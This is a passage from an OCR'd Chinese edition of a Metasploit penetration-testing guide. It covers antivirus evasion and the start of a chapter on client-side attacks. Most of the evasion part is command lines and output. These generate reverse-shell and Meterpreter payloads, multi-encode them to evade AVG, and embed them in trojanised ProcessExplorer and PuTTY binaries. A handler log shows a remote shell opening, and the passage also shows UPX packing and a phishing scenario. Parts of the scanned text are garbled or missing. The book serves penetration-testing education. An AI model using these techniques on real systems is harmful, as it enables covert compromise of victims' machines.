码器输出格式为exe（-texe③），输出的文件名为/var/www/payload2.exe。最后，我们对生成的
文件进行快速类型检查·，确保生成文件是Windows可执行文件格式，检查结果告诉我们文件
没有问题。然而不幸的是，当我们将payload2.exe拷贝到我们的Windows主机上后，还是没能
逃过AVG的检测，如图7-2所示。
FileComponentsHistoryToolsHelp
AVG
You may not be protectedl Please,check the following
Resident Shield:Disabled
Anti-Virus
FreeEdition
Scanresults
Ovorview
ResulsoverviewInfections
QComputer scanne
File
Infectior
Resut
C\Documents andSetingsAdministratorDesktoppayload2exeVirus foundwin32/HeurIntected
Shellextension scan
Update now
图7-2AVG检测出我们编码后的攻击载荷文件包含恶意代码
7.2.2多重编码
如果不是对二进制文件内部机制进行修改，我们和杀毒软件之间总是在玩一个猫捉老鼠的
的文件。在Metasploit框架中，我们可以使用多重编码技术来改善这种状况，这种技术允许对
攻击载荷文件进行多次编码，以绕过杀毒软件的特征码检查。
在前面例子中使用的shikata_ga_nai编码技术是多态（polymorphic）的，也就是说，每次
生成的攻击载荷文件都不一样。杀毒软件如何识别攻击载荷中的恶意代码是一个迷：有时候生
成的文件会被查杀，而有时候却不会。
103
---
## Page 131
Metasploit渗透测试指南
在进行渗透测试前，我们推荐你安装一个测试版的杀毒软件对脚本生成的文件进行测试，
以确保不被检测。下面是一个使用了多重编码的例子：
root@bt:/opt/framework3/msf3# msfpayload windows/meterpreter/reverse_tcp
LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5 0
-t raw  | msfencode -e x86/alpha_upper -c 2 ③ -t raw | msfencode -e
x86/shikata_ga_nai -c 5 ① -t raw | msfencode -e x86/countdown -c 5 @
-t exe-o/var/www/payload3.exe
[*]x86/shikata_ga_nai succeeded with size 318(iteration=1)
[*]x86/shikata_ga_nai succeeded with size 345(iteration=2)
[*] x86/shikata_ga_nai succeeded with size 372 (iteration=3)
[*]x86/shikata_ga_nai succeeded with size 399 (iteration=4)
[*]x86/shikata_ga_nai succeeded with size 426 (iteration=5)
[*]x86/alpha_upper succeeded with size 921(iteration=1)
[*] x86/alpha_upper succeeded with size 1911 (iteration=2)
[*]x86/shikata_ga_nai succeeded with size 1940 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 1969 (iteration=2)
[*]x86/shikata_ga_nai succeeded with size 1998 (iteration=3)
[*]x86/shikata_ga_nai succeeded with size 2027 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 2056 (iteration=5)
[*]x86/countdown succeeded with size 2074(iteration=1)
[*]x86/countdown succeeded with size 2092(iteration=2)
[*]x86/countdown succeeded with size 2110(iteration=3)
[*]x86/countdown succeeded with size 2128(iteration=4)
[*]x86/countdown succeeded with size 2146（iteration=5)
root@bt:/opt/framework3/msf3#
我们使用了5次shikata_ga_nai编码0，将编码后的原始数据·又进行2次alpha_upper
编码，然后再进行5次shikata_ga_nai编码0，接着进行5次countdown编码，最后生成
可执行文件格式。为了进行免杀处理，这里我们对攻击载荷一共执行了17次编码。如图7-3中
所示，这次我们的攻击载荷成功地躲避了杀毒引擎的检测。
Scanresults
Overview
Resulsoverview
Scan"Shell extension scan"wasfinished
Shellextension scan
Update
No infection was found during this scan
Folders selected for scanning:
C:Documents and Setings\Administrator\Desktoppayload3.exe
图7-3AVG未检测出经过多重编码的攻击载荷
104
---
## Page 132
第7章免杀技术
7.3自定义可执行文件模板
通常情况下，运行msfencode命令时，攻击载荷被嵌入到默认的可执行文件模板中，默认
模板文件位于data/templates/template.exe。虽然这个模板文件会时有更新，但它永远是杀毒软件
厂商在创建病毒库时的重点关注对象。实际上，当前版本的msfencode支持使用-x选项使用任
意的Windows可执行程序来代替默认模板文件。在下面的例子中，我们重新对攻击载荷进行编
码，并将微软Sysinternals套件中的ProcessExplorer程序作为自定义的可执行程序模板。
root@bt:/opt/framework3/msf3#wgethttp://download.sysinternals.com/Files/
ProcessExplorer.zip0
...SNIP.··
2011-03-21 17:14:46(119 KB/s)-'ProcessExplorer.zip′saved [1615732/1615732]
root@bt:/opt/framework3/msf3# cdwork/
root@bt:/opt/framework3/msf3/work# unzip ../ProcessExplorer.zip @
Archive:../ProcessExplorer.zip
inflating: procexp.chm
inflating: procexp.exe
inflating:Eula.txt
root@bt:/opt/framework3/msf3/work#cd..
root@bt:/opt/framework3/msf3#msfpayload windows/shell_reverse_tcp
0/var/www/pe_backdoor.exe-ex86/shikata_ga_nai-c5
[*]x86/shikata_ga_nai succeeded with size 342(iteration=1)
[*]x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*]x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*]x86/shikata_ga_nai succeeded with size 450 (iteration=5)
使用-x标志指定下载的ProcessExplorer二进制文件用作我们的自定义模板③。编码完成后，我
们通过msfcli启动multi/handler模块对入站的连接进行监听，如下所示：
root@bt:/opt/framework3/msf3#msfcliexploit/multi/handlerPAYLoAD=windows/
shell_reverse_tcp LH0ST=192.168.1.101 LP0RT=8080 E
[*] Please wait while we load the module tree...
[*]Started reverse handler on 192.168.1.101:8080
[*]Starting the payload handler...
[*] Command shell session 1 opened (192.168.1.101:8080 -> 192.168.1.195:1191)
C:\DocumentsandSettings\Administrator\MyDocuments\Downloads>
看，我们成功地打开了一个远程的shell，而且没有被杀毒软件发现！
105
---
## Page 133
Metasploit渗透测试指南
Scanresults
Overview
Results overview
QCompuler scanner
Scan"Shell extension
Shellextension scan
Update now
No infection was found during this scar
Folders selected for scanning
C:\D ocumients and Setings\Adninistrator\D esktoppe_backdoor.exe
图7-4运行的后门程序没有被AVG查杀
7.4隐秘地启动一个攻击载荷
大多数情况下，当被攻击的用户运行类似我们刚刚生成的这种包含后门的可执行文件时，
什么都没有发生，这很可能会引起用户的怀疑。为了避免被目标查觉，你可以在启动攻击载荷
的同时，让宿主程序也正常运行起来，如下所示：
putty/latest/x86/putty.exe 0
...SNIP...
2011-03-2117:02:48(133 KB/s)-‘putty.exe'saved[454656/454656]
root@bt:/opt/framework3/msf3#msfpayloadwindows/shell_reverse_tcp
www/putty_backdoor.exe-ex86/shikata_ga_nai-k-c5
[*]x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*]x86/shikata_ga_nai succeeded with size369(iteration=2)
[*]x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*]x86/shikata_ga_nai succeeded withsize 45o(iteration=5)
k选项会配置攻击载荷在一个独立的线程中启动，这样宿主程序在执行时不会受到影响。如图
7-5所示，当使用AVG对生成的文件扫描时，没有发现异常，而且返回shel1后，PuTTY程序
实验环境中进行了测试。）
面的应用程序。因为如果你使用了一个命令行应用程序，当攻击载荷启动后，它会在目标主机
应用程序，即使没有-k参数，攻击载荷启动后也不会留下任何其他窗口。请关注这些小细节，
106
---
## Page 134
第7章免杀技术
这将有助于让你保持隐秘的状态。
Scanresults
Overview
Results overview
QComputer scanne
Scan"Shellextension scan"was finished.
Shellextension scar
Update now
Noinfection was found duringthissca
Folders selected for scanning:
C:Documents and Settings\AdministratorDesktop^putty_backdoor.exe
图7-5AVG报告攻击载荷文件是安全的
7.5加壳软件
加壳软件是一类能够对可执行文件进行加密压缩并将解压代码嵌入其中的工具。当加过壳
的文件被执行后，解压代码会从已压缩的数据中重建原始程序并运行。这些过程对用户是透明
的，所以加壳后的程序可以代替原始程序使用。加壳后，可执行文件更小，而功能与原来的文
件一样。
同MSF编码器一样，加壳软件也可以改变可执行文件的结构。然而，MSF编码器通常会
软件对我们的payload3.exe进行编码和压缩，以尝试对该文件进行免杀处理。
root@bt:/#apt-getinstallupx0
.·.SNIP..·
root@bt:/#upx@
UltimatePacker for eXecutables
Copyright(C)1996-2009
UPX 3.04
Markus Oberhumer，Laszlo Molnar & John Reiser
Sep 27th 2009
Usage:upx[-123456789dlthvL][-qvfk][-o file]file..
·.SNIP..：
UPX comes with ABSOLUTELY NO wARRANTY; for details visit http://upx.sf.net
107
---
## Page 135
Metasploit渗透测试指南
root@bt:/#upx-5/var/www/payload3.exe③
Ultimate Packer foreXecutables
Copyright (C) 1996- 2009
UPX 3.04
Markus Oberhumer，LaszloMolnar& John Reiser
Sep 27th 2009
File size
Ratio
Format
Name
37888->
22528
59.46%win32/pe
payload3.exe
Packed1 file.
我们首先安装了UPX软件·，我们输入一个不带参数的UPX命令?以查看它支持哪些选
项。接着我们使用-5选项对我们的可执行文件进行压缩并加壳③。在·处你可以看见UPX将我
们的原始攻击文件的体积压缩了59.46%。
在我们的测试中，42个杀毒厂商中仅有9个报告UPX加壳后的文件存在恶意代码。
提示：PolyPackProject（http:/jon.oberheide.org/files/woot09-polypack.pdf）展示了对一些
已知恶意代码文件使用各种加壳软件在加壳前后杀毒软件查杀情况的对比。
错误！
在本章中我们仅仅介绍了msfpayload和msfencode两个功能程序，实际上还有一
个附加工具msfvenom，它将msfpayload和msfencode的功能整合在了一个更加简便
的用户接口中。本书中没有对msfvenom进行详细介绍（可以参考附录B），但当你熟
悉了msfpayload和msfencode命令后，应当很容易就能掌握它的用法。
7.6小结：关于免杀处理的最后忠告
杀毒软件的世界日新月异，甚至比互联网标准的变化还要快。截止本书写作的时候，本章
中介绍的方法和过程都还是适用的；但是经验表明，免杀技术几个月内便可能有重大变化。虽
然Metasploit开发团队不断地对攻击载荷进行调整，期望能走在检测技术的前面，但如果你发
现本章中介绍的某些例子不再有效时，不必感到惊讶。如上所述，当你试图对生成的文件进行
免杀处理时，应考虑多重使用编码器和加壳软件，或编写自己专用的工具。同其他渗透测试技
术一样，免杀处理需要不断的实践和专项研究，这样才能提高实际工作中的成功几率。
108
---
## Page 136
第
章
客户端渗透攻击
近几年，专注于网络外围的防御技术使得传统方式渗透攻击的成功率大大降低。当通过
某种途径的攻击变得难以成功渗透时，攻击者便会去寻找新的、更加容易的方法去攻击他们
的目标。客户端渗透攻击便是在网络防御变得更加有效的情形下，演化而来的一种新的攻击
形式。这类攻击的目标是主机上安装的常用应用软件，例如Web浏览器、PDF阅读器和微软
系列办公软件等，由于主机通常默认安装上述这些应用软件，它们显然会优先成为黑客的攻
击目标。加上很少实施定期补丁更新，这些存在于用户主机上的应用软件往往处于比较过时
且不安全的状态。Metasploit包含了一批内置的客户端渗透攻击模块，我们将在这一章中进行
深入阐述。
你成功侵入这个网络的机会就会很大。假定你正在通过社会工程学对一个公司实施黑盒渗透测
试，发送一封钓鱼邮件给目标用户将是最有可能成功渗透的途径。你可以收集邮箱地址、姓名、
电话号码，浏览社交网络站点，并创建一个该公司的已知雇员列表，然后编写一封恶意邮件，告
---
## Page 137
Metasploit渗透测试指南
知他们需要点击邮件中的一个链接（指向恶意渗透攻击页面）来更新工资信息。只要目标用户
点击了邮件里的链接，用户主机将会被控制，然后你就可以成功进入公司内部网络。
这样一个场景经常出现在渗透测试和真实的恶意攻击事件中。相比较于针对暴露在互联网
上的资源实施渗透攻击，对用户的攻击往往更加容易。然而与之相反的是，大多数的组织机构
都投入了大量资金去购买诸如入侵防御系统（IPS）、Web应用防火墙等设备来保护那些暴露在
互联网上的系统主机，而不是投入相当的精力去教育他们的员工，来了解社会工程学方面的
攻击。
在2011年3月，一名攻击者用类似的方式入侵了著名的安全公司一RSA。“一位恶意攻击
者发送了一封钓鱼邮件给特定用户，这个邮件包含一个精心构造的AdobeFlashOday漏洞攻击
代码。（这种攻击方式就是SpearPhishing，即针对性钓鱼攻击技术。针对性钓鱼是指攻击者的
钓鱼目标是经过仔细研究选定的，而不是从一本公司的花名册上随机选定的。）在这次入侵RSA
的事件中，攻击者构造的邮件只发送给一小群的用户，通过攻击他们进入了RSA公司的内部关
联系统，然后进一步渗透进入内部业务网络。
8.1基于浏览器的渗透攻击
在这一节中，我们将集中讨论Metasploit框架中基于浏览器的渗透攻击。由于在很多的组
织机构里，浏览器是用户使用得最多的应用软件，因此，基于浏览器的渗透攻击是一项最为常
用和重要的技术。
用户点击该链接时，他们的浏览器将会访问我们事先构造好的网站，这些特殊构造的网页将会
溢出某个特定版本IE浏览器中的一个程序漏洞。如果用户使用的浏览器是包含漏洞的版本，
那么当他的浏览器访问我们的恶意网站时，他的主机将会轻而易举地被我们所控制。而在攻
击者这边，通过植入一个类似Meterpreter的攻击载荷，就可以获取到用户主机环境中的控制
连接。